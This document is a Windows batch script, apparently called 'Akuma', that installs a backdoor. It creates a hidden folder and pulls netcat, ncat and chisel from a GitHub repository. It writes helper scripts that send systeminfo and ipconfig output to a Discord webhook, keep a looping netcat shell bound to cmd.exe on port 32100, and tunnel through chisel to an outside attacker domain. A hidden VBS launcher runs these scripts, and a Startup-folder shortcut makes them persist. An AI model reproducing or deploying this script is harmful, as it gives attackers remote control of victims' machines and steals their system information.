@echo off
echo powershell Add-MpPreference -ExclusionPath "$env:homedrive\Akuma"
%homedrive%
rmdir /s /q %homedrive%\Akuma
mkdir %homedrive%\Akuma
attrib +h %homedrive%\Akuma
cd %homedrive%\Akuma
mkdir %homedrive%\Akuma\ncat-portable-5.59BETA1
mkdir %homedrive%\Akuma\nc 
curl -L https://github.com/l-urk/Akuma/raw/main/ncat.exe > %homedrive%\Akuma\ncat-portable-5.59BETA1\ncat.exe
curl -L https://github.com/l-urk/Akuma/raw/main/nc.exe > %homedrive%\Akuma\nc\nc
curl -L https://github.com/l-urk/Akuma/raw/main/libcrypto-3.dll > %homedrive%\Akuma\nc\libcrypto-3.dll
curl -L https://github.com/l-urk/Akuma/raw/main/chisel.exe > chisel.exe
echo del %homedrive%\Akuma\systeminfo.txt >> %homedrive%\Akuma\zonbi.bat
echo systeminfo ^>^> %homedrive%\Akuma\systeminfo.txt >> %homedrive%\Akuma\zonbi.bat
echo ipconfig /all ^>^> %homedrive%\Akuma\systeminfo.txt >> %homedrive%\Akuma\zonbi.bat
echo curl -X POST -H "Content-Type: multipart/form-data" -F "file=@%homedrive%\Akuma\systeminfo.txt" -F "content=zombi" https://discord.com/api/webhooks/1163478530538082437/riroyuxV8prESa8RqsYDxyLGPqksgCDMyGMwvuNxOyXkC8fzIgkvvpCUdzMU6Xlgj6Ht >> %homedrive%\Akuma\zonbi.bat
echo :start >> %homedrive%\Akuma\ncat.bat
echo %homedrive%\Akuma\nc\nc.exe -lvp 32100 -e cmd.exe >> %homedrive%\Akuma\ncat.bat
echo goto start >> %homedrive%\Akuma\ncat.bat
echo :start >> %homedrive%\Akuma\chisel.bat
echo %homedrive%\Akuma\chisel.exe client 127.0.0.1:32101 4kum4n0d3z3r0.xyz:32100 >> %homedrive%\Akuma\chisel.bat
echo goto start >> %homedrive%\Akuma\chisel.bat
echo Set objShell = CreateObject("WScript.Shell") >> %homedrive%\Akuma\Akuma.vbs
echo objShell.Run "%homedrive%\Akuma\ncat.bat", 0, False >> %homedrive%\Akuma\Akuma.vbs
echo objShell.Run "%homedrive%\Akuma\chisel.bat", 0, False >> %homedrive%\Akuma\Akuma.vbs
echo objShell.Run "%homedrive%\Akuma\zonbi.bat", 0, False >> %homedrive%\Akuma\Akuma.vbs
tar -xf ncat-portable-5.59BETA1.zip
echo y| del "%AppData%\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Akuma.lnk"
powershell "$s=(New-Object -COM WScript.Shell).CreateShortcut('%userprofile%\Start Menu\Programs\Startup\Akuma.lnk');$s.TargetPath='%homedrive%\Akuma\Akuma.vbs';$s.Save()"
start %homedrive%\Akuma\Akuma.vbs
exit
